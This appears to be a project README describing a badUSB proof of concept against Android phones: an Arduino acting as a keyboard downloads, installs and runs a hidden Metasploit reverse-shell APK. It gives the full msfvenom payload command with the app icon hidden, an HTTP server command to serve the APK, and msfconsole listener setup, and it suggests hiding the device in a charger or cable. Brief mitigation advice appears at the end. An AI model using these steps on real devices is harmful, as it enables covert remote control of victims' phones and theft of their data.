# badUSB targeting Android (aka rubber duck) 

This is a proof of concept of a badUSB attack targeting android, a Arduino is plugged into the phone's USB port (via OTG cable), then the Arduino is programmed to act as a keyboard, then it opens the Browser , Download, installs and runs a apk (a metasploit reverse shell).

While you had to plug the Arduino into the phone, again this is a proof of concept, the attack can be embed into a charger or cable.  

Watch the [screenRecord](screenRecord.mp4) or the [video](video.mp4) to see the attack in action!


## Instructions:

To run this attack you have to:

1. Generate and serve the apk.
2. Keep the metasploit shell ready.
3. Program the Arduino
4. Plug the Arduino into the phone.

### Generating the apk

(You have to have metasploit installed) run:

> msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.201 LPORT=4444 AndroidHideAppIcon=true R > /path/to/filename.apk

set **LHOST** and **LPORT** accordingly 

then serve the apk:

```
cd path/to/apk
python3 -m http.server 8080
```

### Keeping the metasploit shell ready

run the following:

```
msfconsole
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.201
set LPORT 4444
use exploit/multi/handler
run
```

set **LHOST** and **LPORT** accordingly 

### Program the Arduino

In this step I used a DIY Brazilian attiny85 board called [franzininho](https://franzininho.com.br/), It's the same as using a Digispark

After you have prepared the Arduino IDE for the Digispark board, change the IP address and apkfilename in the [Arduino code](androidBadUsbvf.ino) then upload it to the board.

Finally plug the Arduino into the Phone via the OTG cable.

## Tested on:

The attack was successful on the following phones:

* Moto G8 Plus (Doha): build fingerprint: motorola/doha/doha:9/PPI29.65-24/773d3:user/release-keys ; Security patch level: September 1, 2019; Chrome version 78.0.3904.96


## Mitigations:

In order to mitigate this attack you could just leave the phone always locked when charging. 

But I believe the Android should prevent this type of attack, Android could don't authorize USB devices and display a warning asking if the user really plugged a keyboard and if authorize it, similar to [usbguard](https://usbguard.github.io/);
